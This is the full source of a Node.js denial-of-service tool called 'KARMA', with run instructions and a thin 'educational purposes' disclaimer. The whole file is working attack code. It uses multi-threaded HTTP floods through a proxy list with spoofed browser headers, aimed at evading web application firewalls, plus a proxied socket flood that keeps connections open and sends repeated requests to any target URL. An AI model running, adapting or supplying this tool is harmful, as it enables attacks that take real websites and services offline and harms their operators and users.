/**
 * KARMA - The Final Version
 *
 * DESCRIPTION:
 * This script is the culmination of all previous versions, designed for maximum
 * impact. It combines a low-level socket flood (for overwhelming network resources)
 * with a high-level, intelligent HTTP/2 flood (for bypassing WAFs like Cloudflare)
 * that run simultaneously in multiple threads.
 *
 * WARNING: EXTREMELY DANGEROUS AND RESOURCE-INTENSIVE.
 * THIS SCRIPT WILL PUSH YOUR SYSTEM TO ITS ABSOLUTE LIMIT AND WILL LIKELY
 * CAUSE IT TO CRASH. USE WITH EXTREME CAUTION AND AT YOUR OWN RISK.
 *
 * LEGAL DISCLAIMER:
 * This tool is provided for educational and research purposes ONLY.
 * Unauthorized attacks against any computer network are illegal under
 * R.A. 10175 (Cybercrime Prevention Act of 2012) and other international
 * laws. The developer assumes NO liability and is NOT responsible for any
 * misuse or damage caused by this program.
 *
 * HOW TO USE:
 * 1. Save as `ddos.js`.
 * 2. Create `proxy.txt`. Proxies are STRONGLY recommended.
 * 3. Install dependency: npm install got-scraping
 * 4. Run from terminal: node ddos.js <url> <seconds> <threads>
 */

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const fs = 'fs';
const net = 'net';
const tls = 'tls';
const url = 'url';

// --- Main Thread Logic ---
if (isMainThread) {
    console.log("\x1b[31m", "--- KARMA // The Final Version ---");
    console.log("\x1b[33m", "WARNING: This tool is extremely powerful and dangerous. Use responsibly.");
    console.log("\x1b[0m"); // Reset color

    const targetUrl = process.argv[2];
    const durationSeconds = parseInt(process.argv[3], 10);
    const numThreads = parseInt(process.argv[4], 10);

    if (!targetUrl || !durationSeconds || !numThreads) {
        console.error('ERROR: Missing arguments.');
        console.error('Usage: node ddos.js <url> <seconds> <threads>');
        process.exit(1);
    }

    let proxies = [];
    try {
        proxies = require(fs).readFileSync('proxy.txt', 'utf-8').split(/\r?\n/).filter(p => p.includes(':'));
        if (proxies.length === 0) throw new Error();
        console.log(`[INFO] Proxies loaded: ${proxies.length}`);
    } catch (error) {
        console.error(`[ERROR] 'proxy.txt' is missing or empty. This is required for an effective attack.`);
        process.exit(1);
    }

    console.log(`[INFO] Target: ${targetUrl}`);
    console.log(`[INFO] Threads: ${numThreads}`);
    console.log(`[INFO] Duration: ${durationSeconds} seconds`);
    console.log("--------------------------------------");
    console.log("\x1b[31m", "Brace for impact. Initializing attack in 5 seconds...");
    console.log("\x1b[0m");

    let totalSent = 0;
    let mainStartTime;

    const mainInterval = setInterval(() => {
        if (!mainStartTime) return;
        const elapsedTime = (Date.now() - mainStartTime) / 1000;
        const rps = (totalSent / elapsedTime) || 0;
        process.stdout.write(`\r[ATTACKING] Requests Sent: ${totalSent} | RPS: ${Math.round(rps)}   `);
    }, 1000);

    setTimeout(() => {
        mainStartTime = Date.now();
        console.log("\nATTACK INITIATED. YOUR SYSTEM IS NOW UNDER MAXIMUM LOAD.");

        const proxiesPerWorker = Math.ceil(proxies.length / numThreads);

        for (let i = 0; i < numThreads; i++) {
            const workerProxies = proxies.slice(i * proxiesPerWorker, (i + 1) * proxiesPerWorker);
            if (workerProxies.length === 0) continue;

            const worker = new Worker(__filename, { workerData: { targetUrl, proxies: workerProxies, durationSeconds } });
            worker.on('message', msg => {
                totalSent += msg.sent;
            });
        }
    }, 5000);
}
// --- Worker Thread Logic ---
else {
    (async () => {
        const { gotScraping } = await import('got-scraping');
        const { targetUrl, proxies, durationSeconds } = workerData;
        const net = require('net');
        const tls = require('tls');
        const url = require('url');

        const target = url.parse(targetUrl);
        const isTls = target.protocol === 'https:';
        const port = target.port || (isTls ? 443 : 80);

        const endTime = Date.now() + durationSeconds * 1000;
        let sentCount = 0;

        // --- Attack Vector 1: Intelligent HTTP/2 Flood ---
        const httpFlooder = async () => {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const proxyUrl = `http://${proxy}`;

            try {
                // Fire and forget, we don't care about the response, only sending it.
                gotScraping({
                    url: targetUrl,
                    proxyUrl: proxyUrl,
                    timeout: { request: 15000 },
                    retry: { limit: 0 },
                    headerGeneratorOptions: {
                        browsers: ['chrome'],
                        devices: ['desktop'],
                        operatingSystems: ['windows']
                    }
                }).catch(() => {});
                sentCount++;
            } catch (e) {
                // Swallow errors
            }
        };

        // --- Attack Vector 2: Low-Level Socket Flood ---
        const socketFlooder = () => {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
            const proxyHost = proxy[0];
            const proxyPort = parseInt(proxy[1]);

            const req = `CONNECT ${target.hostname}:${port} HTTP/1.1\r\nHost: ${target.hostname}:${port}\r\n\r\n`;
            let sock = new net.Socket();

            sock.connect(proxyPort, proxyHost, () => {
                sock.write(req);
            });

            sock.on('data', data => {
                // Once connected through proxy, start TLS handshake if needed
                if (data.toString().includes('200')) {
                    let stream = isTls ? tls.connect({ socket: sock, servername: target.hostname }) : sock;
                    
                    // Keep sending minimal data to keep the connection alive
                    setInterval(() => {
                        if (stream.writable) {
                           stream.write("GET / HTTP/1.1\r\nHost: " + target.hostname + "\r\n\r\n");
                           sentCount++;
                        }
                    }, 500);

                    stream.on('error', () => stream.destroy());
                } else {
                    sock.destroy();
                }
            });

            sock.on('error', () => sock.destroy());
        };


        // --- Main Loop ---
        const run = () => {
            if (Date.now() >= endTime) {
                // Send final count and exit
                parentPort.postMessage({ sent: sentCount });
                process.exit(0);
            }

            // Launch a mix of attacks for maximum chaos
            for (let i = 0; i < 100; i++) { // Aggression level for HTTP requests
                httpFlooder();
            }
            for (let i = 0; i < 50; i++) { // Aggression level for socket connections
                socketFlooder();
            }

            setImmediate(run); // Schedule the next run immediately
        };
        
        run();

        // Report back to main thread periodically
        setInterval(() => {
            parentPort.postMessage({ sent: sentCount });
            sentCount = 0; // Reset counter after reporting
        }, 3000);
    })();
}